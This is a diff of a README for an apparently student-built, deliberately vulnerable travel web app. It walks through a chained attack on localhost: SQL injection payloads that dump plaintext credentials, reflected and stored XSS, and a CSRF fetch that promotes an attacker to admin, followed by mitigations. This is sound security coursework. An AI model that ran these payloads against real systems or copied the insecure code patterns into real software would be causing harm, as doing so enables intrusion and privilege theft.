@@ -2,7 +2,7 @@
 
 ## 1. System Architecture Overview
 
-```text
+```
 +-------------------------------------------------------------------------+
 |                           CLIENT SIDE (Browser)                         |
 |   [React Engine] <---> [Bootstrap UI Components] <---> [Auth Provider] |
@@ -27,13 +27,13 @@
 
 ## 2. Web Development Coursework Compliance Matrix
 
-Per the specifications of the Web Development coursework, a group size of two students mandates a minimum layout threshold of **6 discrete application pages**. The application enforces strict universal cross-navigation headers, uniform responsiveness, and active client/server entry assertions.
+Per the specifications of the Web Development coursework, a group size of two students mandates a minimum layout threshold of **6 discrete application pages**.
 
 ### 2.1 Complete Page Manifest & Feature Matrix
 
 | Page Name                   | Routed Path     | Target Functional Purpose                                                                                                                                                           | Form Handling / Input Validation Features                                                                                                                                    |
 | :-------------------------- | :-------------- | :---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | :--------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
-| **Home Dashboard**          | `/`             | Responsive portal showcasing platform capabilities, key travel stats counters, core layout feature-grids, and dynamic customized welcome headers using current authenticated state. | _None (Display & Application Navigation Portal)._                                                                                                                            |
+| **Home Dashboard**          | `/`             | Responsive portal showcasing platform capabilities, key travel stats counters, core layout feature-grids, and dynamic customized welcome headers using current authenticated state. | None (Display & Application Navigation Portal).                                                                                                                              |
 | **User Sign In**            | `/login`        | High-security layout containing user authentication interface. Connected directly to raw database match-checking.                                                                   | Single-state input forms. Captures emails and raw strings. Passwords match via state. Exposes native raw database errors directly to error-boxes upon query failures.        |
 | **Account Creation**        | `/signup`       | System registration screen allowing generation of standard access user profiles with auto-assigned `user` tier roles.                                                               | Active client-side field validation: Enforces non-empty usernames, structurally validated emails, a minimum 6-character boundary for passwords, and structural match checks. |
 | **Destinations Portal**     | `/destinations` | Travel catalog explorer. Interrogates database collection; outputs dynamic cards containing name, location, pricing, trip duration, and visual imagery assets.                      | Real-time text filter form processing queries against the database text fields via an on-submit handler. Displays string parameters directly back into the view.             |
@@ -43,93 +43,107 @@ Per the specifications of the Web Development coursework, a group size of two st
 ### 2.2 Core Web Requirements Execution
 
 - **Responsive Fluidity:** The layout leverages Bootstrap's responsive grid system (`row`, `col-sm-6`, `col-md-4`), elastic container structures, and dynamic visibility flags to render across standard mobile devices, tablets, and full desktop displays.
-- **Stateful Navigation:** A persistent `Navbar.jsx` component implements synchronized routing states via React Router's `NavLink`. The layout adjusts dynamically to show appropriate public or private routes based on the real-time application context provided by `AuthContext.jsx`.
-- **Input Validation Architecture:** Forms implement strict frontend validations (e.g., matching passwords, password length constraints, and presence checks) combined with backend verification checks to reject empty submissions or duplicate registration records.
+- **Stateful Navigation:** A persistent `Navbar.jsx` component implements synchronized routing states via React Router's `NavLink`. The layout adjusts dynamically based on the real-time application context provided by `AuthContext.jsx`.
+- **Input Validation Architecture:** Forms implement strict frontend validations (matching passwords, password length constraints, and presence checks) combined with backend verification checks to reject empty submissions or duplicate registration records.
 
 ---
 
 ## 3. Cybersecurity Coursework Specification: The Chained Attack Vector
 
-The primary objective of the cybersecurity portion of this project is to implement, execute, and document a multi-layered, chained vulnerability path. By linking three distinct security flaws together in a realistic attack sequence, an attacker can escalate privileges from a standard user account to full administrative control.
+The primary objective of the cybersecurity portion of this project is to implement, execute, and document a multi-layered, chained vulnerability path that escalates privileges from a standard user account to full administrative control.
 
-```text
+```
 +------------------------+      +------------------------+      +------------------------+
-|  1. SQL INJECTION      |      |  2. REFLECTED XSS      |      |  3. EXECUTED CSRF      |
-|  - Reconnaissance Phase|      |  - Delivery Mechanism  |      |  - Privilege Change    |
-|  - Extract Admin Email | ===> |  - Inject Script Link  | ===> |  - Target Admin Browser|
-|    & Metadata Identity |      |  - Render via innerHTML|      |  - Fire Promotion API  |
+|  1. SQL INJECTION      |      |  2. REFLECTED XSS      |      |  3. STORED XSS + CSRF  |
+|  - Reconnaissance Phase|      |  - Proof of Execution  |      |  - Privilege Change    |
+|  - Extract Admin Email | ===> |  - Inject via URL Param| ===> |  - Plant Payload in DB |
+|    & Password via UNION|      |  - Render via innerHTML|      |  - Fire Promote API    |
 +------------------------+      +------------------------+      +------------------------+
-                                          ||
-                                          \/
-                           +-------------------------------+
-                           |      ATTACKER ESCALATION      |
-                           |       Full Admin Access       |
-                           +-------------------------------+
+                                                                          ||
+                                                                          \/
+                                                           +-------------------------------+
+                                                           |      ATTACKER ESCALATION      |
+                                                           |       Full Admin Access       |
+                                                           +-------------------------------+
 ```
 
 ---
 
 ## 3.1 Chain Link 1: SQL Injection (Reconnaissance Phase)
 
-- **Vulnerable Endpoint:** `GET /api/destinations?search=`
+**Vulnerable Endpoint:** `GET /api/destinations?search=`
 
-- **Underlying Exploit Mechanism:** The search input value provided by the user is directly interpolated into a raw SQL command string within `server.js` without sanitization or parameterization:
+**Underlying Exploit Mechanism:** The search input value is directly interpolated into a raw SQL command string in `server/index.js` without sanitization or parameterization:
 
 ```javascript
 query = `SELECT * FROM destinations WHERE name ILIKE '%${search}%' OR country ILIKE '%${search}%'`;
 ```
 
-- **Exploitation Objective:** By inputting an unescaped single quote (`'`), an attacker can break out of the string boundary of the `ILIKE` clause. By appending a structural `UNION SELECT` command, the attacker can force the database engine to append rows from the private `users` table directly to the destination results layout returned to the UI.
+**Exploitation Objective:** By injecting an unescaped single quote, an attacker breaks out of the `ILIKE` clause boundary. Appending a `UNION SELECT` command forces the database engine to append rows from the private `users` table directly into the destination results returned to the UI — exposing admin credentials in plaintext.
 
 ---
 
-## 3.2 Chain Link 2: Reflected Cross-Site Scripting (Attack Delivery Phase)
+## 3.2 Chain Link 2: Reflected Cross-Site Scripting (Proof of Execution)
 
-- **Vulnerable Component:** `Destinations.jsx`
+**Vulnerable Component:** `Destinations.jsx`
 
-- **Underlying Exploit Mechanism:** The application reads the raw query search parameter `q` from the current active browser URL bar via React Router's `useSearchParams()`. Instead of rendering this string as text, the interface directly injects the raw input string directly into the page layout via the `dangerouslySetInnerHTML` property to display back to the user:
+**Underlying Exploit Mechanism:** The application reads the raw `q` query parameter from the URL via React Router's `useSearchParams()`. Instead of rendering this as safe text, it is injected directly into the page layout via `dangerouslySetInnerHTML`:
 
 ```javascript
 <span dangerouslySetInnerHTML={{ __html: search }} />
 ```
 
-- **Exploitation Objective:** While modern web browsers filter direct inline `<script>` tags injected via standard `innerHTML` updates, they fully execute inline JavaScript event hooks embedded within standard markup components (e.g., the `onerror` attribute of an `<img>` tag). This allows an attacker to execute arbitrary client-side code in any user's browser by getting them to visit a maliciously crafted link.
+**Exploitation Objective:** A crafted URL causes arbitrary JavaScript to execute in any user's browser who visits the link. This confirms that the attacker has code execution in the browser context — a prerequisite for CSRF delivery.
 
 ---
 
-## 3.3 Chain Link 3: Cross-Site Request Forgery via XSS (Privilege Escalation Phase)
+## 3.3 Chain Link 3: Stored XSS → CSRF (Privilege Escalation Phase)
 
-- **Vulnerable Endpoint:** `POST /api/promote/:userId`
+**Vulnerable Components:** `Blog.jsx` (Stored XSS sink) + `POST /api/promote/:userId` (CSRF target)
 
-- **Underlying Exploit Mechanism:** The state-changing administrative endpoint `/api/promote/:userId` checks if the incoming request session is authenticated and assigned the `admin` role, but it does not validate a unique, cryptographically random anti-CSRF token.
+**Underlying Exploit Mechanism:** Blog post comments are stored raw in the database and rendered unsanitized via `dangerouslySetInnerHTML`:
 
-- **Exploitation Objective:** Because the session token cookie (`connect.sid`) is automatically sent by the browser with every request made to the origin server, an administrative user who executes code via the Reflected XSS link will implicitly make an authenticated `POST` request to the promotion endpoint. The XSS script can trigger an automated background fetch operation targeting `/api/promote/<attacker_id>`, executing the payload within the admin's session context and elevating the attacker's account privileges.
+```javascript
+<div dangerouslySetInnerHTML={{ __html: c.body }} />
+```
+
+The promotion endpoint checks for an admin session but does **not** validate a CSRF token:
+
+```javascript
+app.post("/api/promote/:userId", requireAdmin, async (req, res) => {
+  await pool.query("UPDATE users SET role=$1 WHERE id=$2", ["admin", userId]);
+});
+```
+
+**Exploitation Objective:** The attacker plants a malicious comment containing a hidden `fetch()` call targeting `/api/promote/<attacker_id>`. When an admin opens the blog post to read it, the payload fires automatically — the browser silently sends the admin's session cookie with the promotion request, escalating the attacker to admin without any admin interaction beyond viewing the page.
 
 ---
 
-# 4. Live Demonstration & Proof-of-Concept Exploit Steps
+# 4. Local Setup & Exploitation Walkthrough
 
 ## 4.1 Local Setup Prerequisites
 
-### 1. Create the PostgreSQL Database
+### Step 1 — Create the PostgreSQL Database
 
 ```bash
 createdb wanderly
 ```
 
-Or manually create it using pgAdmin.
+Or create it manually via pgAdmin.
 
 ---
 
-### 2. Initialize Tables & Seed Data
+### Step 2 — Initialize Tables & Seed Data
 
 ```bash
 psql -U postgres -d wanderly -f server/setup.sql
 ```
 
+This creates the `users`, `destinations`, `posts`, and `comments` tables and seeds the admin account and sample data.
+
 ---
 
-### 3. Configure Environment Variables
+### Step 3 — Configure Environment Variables
 
 Inside the `server` folder:
 
@@ -137,7 +151,7 @@ Inside the `server` folder:
 cp .env.example .env
 ```
 
-Then edit `.env`:
+Edit `.env`:
 
 ```env
 DATABASE_URL=postgresql://postgres:YOUR_PASSWORD@localhost:5432/wanderly
@@ -147,7 +161,7 @@ PORT=5000
 
 ---
 
-### 4. Start Backend Server
+### Step 4 — Start the Backend Server
 
 ```bash
 cd server
@@ -157,15 +171,15 @@ npm start
 
 Expected output:
 
-```text
+```
 Server running on http://localhost:5000
 ```
 
 ---
 
-### 5. Start Frontend Client
+### Step 5 — Start the Frontend Client
 
-Open another terminal:
+Open a second terminal:
 
 ```bash
 cd client
@@ -175,165 +189,162 @@ npm run dev
 
 Expected output:
 
-```text
-Local: http://localhost:5173
+```
+Local:   http://localhost:5173
 ```
 
 ---
 
-# 4.2 Detailed Exploitation Execution Steps
+## 4.2 Exploitation Execution Steps
 
-## Step 1 — Generate the Attacker Testing Profile
+### Step 1 — Create the Attacker Profile
 
-1. Open an Incognito browser window.
+1. Open an Incognito browser window and navigate to:
+
+   ```
+   http://localhost:5173/signup
+   ```
+
+2. Register with:
+
+   | Field    | Value              |
+   | -------- | ------------------ |
+   | Username | hacker             |
+   | Email    | hacker@exploit.com |
+   | Password | hackme123          |
+
+3. After signup, navigate to:
+
+   ```
+   http://localhost:5173/profile
+   ```
+
+4. Note your **User ID** displayed on the profile card (usually `2`). This is the target ID used in the CSRF payload.
+
+---
+
+### Step 2 — Execute SQL Injection (Reconnaissance)
+
+1. Navigate to:
+
+   ```
+   http://localhost:5173/destinations
+   ```
+
+2. Paste this payload into the search box and click **Search**:
+   ```
+   nonexistent' UNION SELECT id, username, email, password, 0, role, 'https://placehold.co/400x200' FROM users--
+   ```
+
+**Successful Result Indicators:**
+
+- Destination cards now display database user records instead of destinations.
+- The admin email, plaintext password, and role are visible on the cards.
+
+Expected card contents:
+
+| Card Field (maps to)   | Value              |
+| ---------------------- | ------------------ |
+| Name (username)        | admin              |
+| Country (email)        | admin@wanderly.com |
+| Description (password) | admin123           |
+| Duration (role)        | admin              |
+
+---
+
+### Step 3 — Execute Reflected XSS (Proof of Execution)
+
+Paste this URL directly into the browser address bar:
+
+```
+http://localhost:5173/destinations?q=<img src=x onerror=alert(1)>
+```
+
+**Successful Result Indicators:**
+
+- An alert box fires immediately when the page renders, confirming arbitrary JavaScript execution.
+- The "Showing results for:" label reflects the injected payload.
+
+> Note: `document.cookie` will be empty in the alert because the session cookie is flagged `httpOnly` — this is intentional server-side behaviour. The XSS execution itself is confirmed by the alert firing.
+
+---
+
+### Step 4 — Plant the Stored XSS + CSRF Payload (Blog)
+
+1. Still logged in as the **attacker** account, navigate to:
+
+   ```
+   http://localhost:5173/blog
+   ```
+
+2. Open any blog post.
+
+3. In the comment box, paste this payload — replacing `2` with your actual attacker User ID from Step 1:
+
+   ```html
+   <img
+     src="x"
+     onerror="fetch('/api/promote/2',{method:'POST',credentials:'include'})"
+   />
+   ```
+
+4. Click **Post Comment**. The payload is now permanently stored in the database.
+
+---
+
+### Step 5 — Trigger CSRF via Admin Session
+
+1. Open a **second browser** (or a new Incognito window — different from the attacker session).
+
 2. Navigate to:
 
-```text
-http://localhost:5173/signup
-```
+   ```
+   http://localhost:5173/login
+   ```
 
-3. Register with:
+3. Log in using the admin credentials extracted via SQLi:
 
-| Field    | Value              |
-| -------- | ------------------ |
-| Username | hacker             |
-| Email    | hacker@exploit.com |
-| Password | hackme123          |
+   | Field    | Value              |
+   | -------- | ------------------ |
+   | Email    | admin@wanderly.com |
+   | Password | admin123           |
 
-4. After signup, navigate to:
+4. Navigate to:
 
-```text
-http://localhost:5173/profile
-```
+   ```
+   http://localhost:5173/blog
+   ```
 
-5. Observe your User ID (usually `2`).
+5. Open the same blog post where the attacker posted the comment.
 
----
-
-## Step 2 — Execute SQL Injection
-
-Navigate to:
-
-```text
-http://localhost:5173/destinations
-```
-
-Paste this payload into the search box:
-
-```sql
-nonexistent' UNION SELECT id, username, email, password, 0, role, 'https://placehold.co/400x200' FROM users--
-```
-
-Click **Search**.
-
-### Successful Result Indicators
-
-- Destination cards now display database users instead of destinations.
-- Admin email appears.
-- Admin plaintext password appears.
-- Admin role appears.
-
-Expected visible records:
-
-| Username | Email              | Password | Role  |
-| -------- | ------------------ | -------- | ----- |
-| admin    | admin@wanderly.com | admin123 | admin |
+6. The `<img onerror>` payload fires automatically — no click required. The browser silently sends:
+   ```
+   POST /api/promote/2
+   Cookie: connect.sid=<admin_session>
+   ```
 
 ---
 
-## Step 3 — Execute Reflected XSS
-## Comments Table (Stored XSS)
+### Step 6 — Verify Privilege Escalation
 
-This table was added to support the stored XSS attack chain.
+1. Return to the **attacker browser session**.
 
-Run:
-```javascript
-DROP TABLE IF EXISTS comments;
+2. Navigate to:
+   ```
+   http://localhost:5173/profile
+   ```
 
-CREATE TABLE comments (
-  id SERIAL PRIMARY KEY,
-  content TEXT NOT NULL,
-  created_at TIMESTAMP DEFAULT NOW()
-);
-```
-This table stores user comments without sanitization.
-Attacker navigates to:
+**Successful Result Indicators:**
 
-/promo
-
-Posts malicious comment:
-
-<a href="#" onclick="fetch('/api/promote/2',{method:'POST',credentials:'include'})">
-Claim your free travel reward
-</a>
-
-Replace 2 with attacker's user ID.
-
-The payload becomes permanently stored in PostgreSQL.
-
----
-
-## Step 4 — Execute XSS → CSRF Privilege Escalation
-
-When admin clicks the malicious link:
-
-fetch('/api/promote/2',{
-  method:'POST',
-  credentials:'include'
-})
-## Step 5 – CSRF Occurs
-
-Because:
-
-admin is authenticated
-cookies are automatically included
-endpoint has no CSRF protection
-
-the request is processed as admin.
-### Simulate the Administrator Session
-
-Open another browser or Incognito window.
-
-Navigate to:
-
-```text
-http://localhost:5173/login
-```
-
-Login using:
-
-| Field    | Value              |
-| -------- | ------------------ |
-| Email    | admin@wanderly.com |
-| Password | admin123           |
-
-Now paste the crafted exploit URL into the address bar and press Enter.
-
----
-
-## Step 5 — Verify Privilege Escalation
-
-Return to the attacker browser session.
-
-Navigate to:
-
-```text
-http://localhost:5173/profile
-```
-
-### Successful Result Indicators
-
-- User role badge changes from `user` to `Admin`.
-- Admin dashboard appears.
-- User management table becomes visible.
-
-The attacker account now has full administrator access.
+- The role badge changes from `user` to **Admin**.
+- The Admin Panel — User Management table becomes visible.
+- The attacker account now has full administrator access.
 
 ---
 
 # 5. Relational Database Schema Architecture
 
-```text
+```
 +------------------+          +------------------+
 |      users       |          |   destinations   |
 +------------------+          +------------------+
@@ -361,48 +372,26 @@ The attacker account now has full administrator access.
 
 ---
 
-## 5.1 System Entities Reference Data
+## 5.1 System Entities Reference
 
-### `users`
+**`users`** — Stores usernames, email identities, plaintext passwords, and authorization role levels (`user`, `admin`).
 
-Stores:
+**`destinations`** — Stores travel destination records, pricing, trip durations, and image assets.
 
-- usernames
-- email identities
-- plaintext passwords
-- authorization role levels (`user`, `admin`)
+**`posts`** — Feeds the travel blog interface with editorial content.
 
-### `destinations`
-
-Stores:
-
-- travel destination records
-- pricing
-- trip durations
-- image assets
-
-### `posts`
-
-Feeds the travel blog interface.
-
-### `comments`
-
-Stores user comments linked to blog posts through:
-
-```sql
-post_id REFERENCES posts(id) ON DELETE CASCADE
-```
+**`comments`** — Stores user comments linked to blog posts via `post_id REFERENCES posts(id) ON DELETE CASCADE`. The `body` column is stored raw with no sanitization — the primary Stored XSS vector.
 
 ---
 
 # 6. Defense-in-Depth Mitigation Blueprints
 
-```text
-ATTACK LAYER                    CONTROL REMEDIAL ACTION
+```
+ATTACK LAYER                    REMEDIATION
 +-------------------------+     +-----------------------------------+
 | SQL Injection Route     | ==> | Parameterized Queries             |
 +-------------------------+     +-----------------------------------+
-| Reflected XSS Render    | ==> | React Context Escaping            |
+| Reflected XSS Render    | ==> | React JSX Text Escaping           |
 +-------------------------+     +-----------------------------------+
 | Stored XSS Comments     | ==> | DOMPurify Sanitization            |
 +-------------------------+     +-----------------------------------+
@@ -412,58 +401,46 @@ ATTACK LAYER                    CONTROL REMEDIAL ACTION
 +-------------------------+     +-----------------------------------+
 ```
 
----
-
 ## 6.1 SQL Injection Mitigation
 
-### Vulnerable
+**Vulnerable:**
 
 ```javascript
 query = `SELECT * FROM destinations WHERE name ILIKE '%${search}%'`;
 ```
 
-### Secure
+**Secure:**
 
 ```javascript
-const query =
-  "SELECT * FROM destinations WHERE name ILIKE $1 OR country ILIKE $1";
-
-const values = [`%${search}%`];
-
-const result = await pool.query(query, values);
+const result = await pool.query(
+  "SELECT * FROM destinations WHERE name ILIKE $1 OR country ILIKE $1",
+  [`%${search}%`],
+);
 ```
-
----
 
 ## 6.2 Reflected XSS Mitigation
 
-### Vulnerable
+**Vulnerable:**
 
 ```javascript
-dangerouslySetInnerHTML;
+<span dangerouslySetInnerHTML={{ __html: search }} />
 ```
 
-### Secure
+**Secure:**
 
-```javascript
-<p>
-  Showing results for: <strong>{search}</strong>
-</p>
+```jsx
+<span>{search}</span>
 ```
 
-React automatically escapes dangerous HTML entities.
-
----
+React automatically escapes HTML entities when rendering via JSX — no additional library needed.
 
 ## 6.3 Stored XSS Mitigation
 
 ```javascript
 import DOMPurify from "dompurify";
 
-const sanitizedComment = DOMPurify.sanitize(comment);
+<div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(c.body) }} />;
 ```
-
----
 
 ## 6.4 CSRF Mitigation
 
@@ -473,26 +450,22 @@ app.post(
   requireAdmin,
   verifyCsrfToken,
   async (req, res) => {
-    // protected route
+    // verifyCsrfToken checks a cryptographically random token in the request header
+    // that cannot be forged by a cross-origin fetch call
   },
 );
 ```
-
----
 
 ## 6.5 Password Hashing Mitigation
 
 ```javascript
 const bcrypt = require("bcrypt");
-
 const hashedPassword = await bcrypt.hash(password, 12);
 ```
 
 ---
 
-# 7. Operational Commands Quick Reference
-
-## 7.1 Development Environment Controls
+# 7. Quick Reference Commands
 
 ### Initialize Database
 
@@ -503,38 +476,19 @@ psql -U postgres -d wanderly -f server/setup.sql
 ### Start Backend
 
 ```bash
-cd server
-npm install
-npm start
+cd server && npm install && npm start
 ```
 
 ### Start Frontend
 
 ```bash
-cd client
-npm install
-npm run dev
+cd client && npm install && npm run dev
 ```
 
----
-
-## 7.2 Git Branch Controls
-
-### Show Current Branch
+### Git Controls
 
 ```bash
-git branch
-```
-
-### Switch to Vulnerable Branch
-
-```bash
-git checkout simple-vulnerable
-```
-
-### Review Local Repository State
-
-```bash
-git status
-git log --oneline
+git branch                    # show current branch
+git checkout simple-vulnerable # switch to vulnerable branch
+git status && git log --oneline
 ```
